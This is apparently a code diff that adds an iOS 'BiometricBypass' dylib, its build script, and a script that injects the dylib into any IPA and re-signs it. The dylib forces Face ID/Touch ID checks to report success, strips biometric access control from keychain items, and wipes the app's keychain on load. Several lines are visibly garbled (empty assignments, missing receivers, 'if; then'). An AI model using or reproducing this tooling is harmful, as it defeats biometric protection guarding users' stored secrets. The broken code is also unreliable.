@@ -1,37 +1,320 @@
-import lief
-import sys
-import os
+//
+//  Bypass.m
+//  BiometricBypass
+//
+//  Production-grade hook for iOS Biometric and Keychain Security.
+//
 
-def inject_dylib(binary_path, dylib_path):
-    print(f"Processing: {binary_path}")
-    
-    # 1. Parse the binary
-    binary = lief.parse(binary_path)
-    
-    if not binary:
-        print("Error: Could not parse binary.")
-        sys.exit(1)
+#import <Foundation/Foundation.h>
+#import <LocalAuthentication/LocalAuthentication.h>
+#import <Security/Security.h>
+#import <objc/runtime.h>
+#import "fishhook.h" // Ensure fishhook.h is in the include path
 
-    # 2. Add the library dependency
-    # We use @executable_path so the app looks for the dylib in its own folder
-    header_path = f"@executable_path/{os.path.basename(dylib_path)}"
-    print(f"Injecting load command: {header_path}")
-    
-    binary.add_library(header_path)
-    
-    # 3. Write the modified binary back to disk
-    # We overwrite the original file
-    output_path = binary_path 
-    binary.write(output_path)
-    
-    print(f"Success! Modified binary saved to: {output_path}")
+// ============================================================================
+// SECTION 1: LOGGING UTILITIES
+// ============================================================================
+// Centralized logging helps debug the bypass on physical devices via Console.app
+void Log(NSString *format,...) {
+    va_list args;
+    va_start(args, format);
+    NSString *logStr = initWithFormat:format arguments:args];
+    NSLog(@" %@", logStr);
+    va_end(args);
+}
 
-if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print("Usage: python3 inject.py <path_to_app_binary> <path_to_dylib>")
-        sys.exit(1)
+// ============================================================================
+// SECTION 2: KEYCHAIN HOOKS (C FUNCTIONS)
+// ============================================================================
+
+// Function pointers to store the original implementations (Trampolines)
+// We need these to call the *real* Keychain functions after modifying the arguments.
+static OSStatus (*orig_SecItemAdd)(CFDictionaryRef attributes, CFTypeRef *result);
+static OSStatus (*orig_SecItemUpdate)(CFDictionaryRef query, CFDictionaryRef attributesToUpdate);
+static OSStatus (*orig_SecItemCopyMatching)(CFDictionaryRef query, CFTypeRef *result);
+static OSStatus (*orig_SecItemDelete)(CFDictionaryRef query);
+
+/**
+ *  Helper Function: StripAccessControl
+ *  This function performs the "Downgrade Attack". It takes a keychain query dictionary,
+ *  removes the Access Control List (which requires Biometrics), and substitutes
+ *  a relaxed protection level (AccessibleAfterFirstUnlock).
+ */
+NSMutableDictionary* StripAccessControl(CFDictionaryRef dict) {
+    // Create a mutable copy of the query dictionary so we can modify it
+    NSMutableDictionary *newDict =;
+    
+    // 1. Check specifically for kSecAttrAccessControl
+    if (newDict) {
+        Log(@"Detected kSecAttrAccessControl. Downgrading security policy...");
         
-    app_binary = sys.argv[1]
-    dylib_file = sys.argv[2]
+        // Remove the biometric requirement
+       ;
+        
+        // We must replace it with a valid protection class.
+        // kSecAttrAccessibleAfterFirstUnlock is standard for non-biometric secure storage.
+        newDict = (__bridge id)kSecAttrAccessibleAfterFirstUnlock;
+    }
     
-    inject_dylib(app_binary, dylib_file)
+    // 2. Remove Authentication UI Contexts
+    // These keys tell the system to present a UI or use a specific LAContext.
+    // Since we are bypassing auth, we remove them to prevent system confusion.
+    if (newDict) {
+       ;
+    }
+    if (newDict) {
+       ;
+    }
+    
+    return newDict;
+}
+
+/**
+ *  Hooked Implementation: SecItemAdd
+ *  Intercepts requests to save data. Strips biometric requirements before saving.
+ */
+OSStatus hooked_SecItemAdd(CFDictionaryRef attributes, CFTypeRef *result) {
+    Log(@"Intercepted SecItemAdd");
+    NSMutableDictionary *safeAttributes = StripAccessControl(attributes);
+    // Call the original function with our modified "safe" attributes
+    return orig_SecItemAdd((__bridge CFDictionaryRef)safeAttributes, result);
+}
+
+/**
+ *  Hooked Implementation: SecItemUpdate
+ *  Intercepts requests to update data. Ensures we don't accidentally re-add security.
+ */
+OSStatus hooked_SecItemUpdate(CFDictionaryRef query, CFDictionaryRef attributesToUpdate) {
+    Log(@"Intercepted SecItemUpdate");
+    // Strip from the search query (to find the item) AND the update attributes
+    NSMutableDictionary *safeQuery = StripAccessControl(query);
+    NSMutableDictionary *safeAttributes = StripAccessControl(attributesToUpdate);
+    return orig_SecItemUpdate((__bridge CFDictionaryRef)safeQuery, (__bridge CFDictionaryRef)safeAttributes);
+}
+
+/**
+ *  Hooked Implementation: SecItemCopyMatching
+ *  Intercepts requests to read data. 
+ *  Crucial for preventing 'errSecInteractionNotAllowed'.
+ */
+OSStatus hooked_SecItemCopyMatching(CFDictionaryRef query, CFTypeRef *result) {
+    Log(@"Intercepted SecItemCopyMatching");
+    // When reading, the app might pass an LAContext or AuthUI requirement.
+    // We strip these so the system treats it as a standard file read.
+    NSMutableDictionary *safeQuery = StripAccessControl(query);
+    return orig_SecItemCopyMatching((__bridge CFDictionaryRef)safeQuery, result);
+}
+
+// ============================================================================
+// SECTION 3: LOCAL AUTHENTICATION SWIZZLING (OBJECTIVE-C)
+// ============================================================================
+
+@interface LAContext (Bypass)
+@end
+
+@implementation LAContext (Bypass)
+
+/**
+ *  +load is called automatically by the Objective-C runtime when the dylib is loaded.
+ *  This is the entry point for our Swizzling logic.
+ */
++ (void)load {
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        Class class = [self class];
+        
+        // Selectors for the original and our replacement method
+        SEL originalSelector = @selector(evaluatePolicy:localizedReason:reply:);
+        SEL swizzledSelector = @selector(hooked_evaluatePolicy:localizedReason:reply:);
+        
+        Method originalMethod = class_getInstanceMethod(class, originalSelector);
+        Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
+        
+        // Atomically exchange the implementations
+        method_exchangeImplementations(originalMethod, swizzledMethod);
+        Log(@"Swizzling complete: LAContext evaluatePolicy");
+    });
+}
+
+/**
+ *  The Replacement Method
+ *  Instead of talking to the Secure Enclave, this method immediately calls the reply block.
+ */
+- (void)hooked_evaluatePolicy:(LAPolicy)policy
+              localizedReason:(NSString *)localizedReason
+                        reply:(void(^)(BOOL success, NSError *error))reply {
+    Log(@"Bypassing Biometric Prompt: %@", localizedReason);
+    
+    // STATIC BYPASS: Always return YES (Success) and nil (No Error)
+    if (reply) {
+        // Execute the app's callback on a background queue to simulate async behavior
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+            reply(YES, nil);
+        });
+    }
+}
+
+// Hook canEvaluatePolicy to always return true, preventing apps from hiding biometric buttons
+- (BOOL)hooked_canEvaluatePolicy:(LAPolicy)policy error:(NSError * __autoreleasing *)error {
+    Log(@"Bypassing canEvaluatePolicy - Reporting FaceID Available");
+    return YES;
+}
+
+@end
+
+// ============================================================================
+// SECTION 4: INITIALIZATION & CLEANUP
+// ============================================================================
+
+/**
+ *  ClearKeychain
+ *  Critical for stability. If the app was previously installed without the hook,
+ *  the Keychain will contain items WITH Access Control Lists.
+ *  Our hook removes ACLs on *write*, but if we try to *read* an old item that has ACLs,
+ *  the system will still demand biometrics (which we can't provide via hook).
+ *  Therefore, we must wipe the app's keychain on launch to ensure a fresh start.
+ */
+void ClearKeychain() {
+    Log(@"Clearing Keychain to remove legacy ACL-protected items...");
+    
+    NSArray *secClasses = @;
+    
+    for (id secClass in secClasses) {
+        // Construct a query to match ALL items of this class
+        NSDictionary *spec = @{(__bridge id)kSecClass: secClass};
+        // Delete them
+        SecItemDelete((__bridge CFDictionaryRef)spec);
+    }
+}
+
+/**
+ *  Constructor
+ *  This function runs immediately when the Dylib is loaded into memory by dyld.
+ *  It initializes the C-function hooks (fishhook).
+ */
+__attribute__((constructor))
+static void initialize(void) {
+    Log(@"BiometricBypass Dylib Loaded into Process Memory!");
+    
+    // 1. Wipe old keychain items to prevent conflicts
+    ClearKeychain();
+    
+    // 2. Define the rebindings for fishhook
+    // Structure: { "String Name of Symbol", Replacement Function Pointer, Pointer to Store Original }
+    struct rebinding rebindings = {
+        {"SecItemAdd", hooked_SecItemAdd, (void *)&orig_SecItemAdd},
+        {"SecItemUpdate", hooked_SecItemUpdate, (void *)&orig_SecItemUpdate},
+        {"SecItemCopyMatching", hooked_SecItemCopyMatching, (void *)&orig_SecItemCopyMatching},
+    };
+    
+    // 3. Apply the hooks
+    // 3 = number of items in the array
+    rebind_symbols(rebindings, 3);
+    Log(@"Fishhook rebindings applied.");
+}
+
+---------------------------------------------------------
+
+#!/bin/bash
+
+# 1. Define SDK Path (iOS Device SDK)
+SDK=$(xcrun --sdk iphoneos --show-sdk-path)
+
+# 2. Compile
+# -arch arm64: Target modern iOS devices
+# -shared: Create a dynamic library
+# -fPIC: Position Independent Code (Required for Dylibs)
+# -framework: Link system frameworks so symbols resolve
+# fishhook.c: Include the fishhook implementation
+
+echo "Building BiometricBypass.dylib for arm64..."
+
+xcrun clang \
+    -isysroot "$SDK" \
+    -arch arm64 \
+    -shared -fPIC \
+    -framework Foundation \
+    -framework Security \
+    -framework LocalAuthentication \
+    -o BiometricBypass.dylib \
+    Bypass.m fishhook.c
+
+# 3. Code Sign the Dylib
+# Even the dylib itself must be signed to run on a non-jailbroken device.
+# Replace 'Apple Development' with your actual certificate name.
+
+echo "Signing Dylib..."
+codesign -f -s "Apple Development" BiometricBypass.dylib
+
+echo "Build Complete: BiometricBypass.dylib"
+
+----------------------------------------------------------
+
+#!/bin/bash
+set -e # Exit on error
+
+# USAGE:./patch_ipa.sh <Input_IPA> <Dylib_Path> <Provisioning_Profile> <Cert_Identity>
+
+IPA="$1"
+DYLIB="$2"
+PROVISION="$3"
+IDENTITY="$4"
+
+# 1. Cleanup & Unzip
+rm -rf Payload patched.ipa
+unzip -q "$IPA"
+
+# 2. Identify App Name
+APP_PATH=$(find Payload -name "*.app" -maxdepth 1)
+APP_NAME=$(basename "$APP_PATH")
+BINARY_NAME=$(defaults read "$(pwd)/$APP_PATH/Info.plist" CFBundleExecutable)
+
+echo "Target App: $APP_NAME"
+echo "Binary: $BINARY_NAME"
+
+# 3. Inject Dylib
+# We copy the dylib into the Frameworks directory (standard iOS structure)
+mkdir -p "$APP_PATH/Frameworks"
+cp "$DYLIB" "$APP_PATH/Frameworks/"
+DYLIB_NAME=$(basename "$DYLIB")
+
+echo "Injecting Load Command..."
+# The path must be relative to the executable using @executable_path
+optool install -c load -p "@executable_path/Frameworks/$DYLIB_NAME" -t "$APP_PATH/$BINARY_NAME"
+
+# 4. Entitlements Extraction
+# We need valid entitlements to sign. We extract them from the provisioning profile.
+echo "Extracting Entitlements from Provisioning Profile..."
+security cms -D -i "$PROVISION" > provision.plist
+/usr/libexec/PlistBuddy -x -c 'Print :Entitlements' provision.plist > entitlements.plist
+
+# 5. Recursive Code Signing (Inside-Out)
+echo "Starting Recursive Sign..."
+
+# 5a. Sign Frameworks
+if; then
+    find "$APP_PATH/Frameworks" -name "*.dylib" -o -name "*.framework" | while read lib; do
+        echo "Signing Framework: $lib"
+        # --preserve-metadata=identifier ensures we don't break bundle ID requirements
+        codesign -f -s "$IDENTITY" --entitlements entitlements.plist --timestamp=none --preserve-metadata=identifier,flags "$lib"
+    done
+fi
+
+# 5b. Sign PlugIns (App Extensions)
+if; then
+    find "$APP_PATH/PlugIns" -name "*.appex" | while read plugin; do
+        echo "Signing Plugin: $plugin"
+        codesign -f -s "$IDENTITY" --entitlements entitlements.plist --timestamp=none --preserve-metadata=identifier,flags "$plugin"
+    done
+fi
+
+# 5c. Sign Main Application
+echo "Signing Main Binary..."
+cp "$PROVISION" "$APP_PATH/embedded.mobileprovision"
+codesign -f -s "$IDENTITY" --entitlements entitlements.plist --timestamp=none "$APP_PATH"
+
+# 6. Repackage
+echo "Zipping IPA..."
+zip -qr "patched_insecure.ipa" Payload
+
+echo "Done! Output: patched_insecure.ipa"
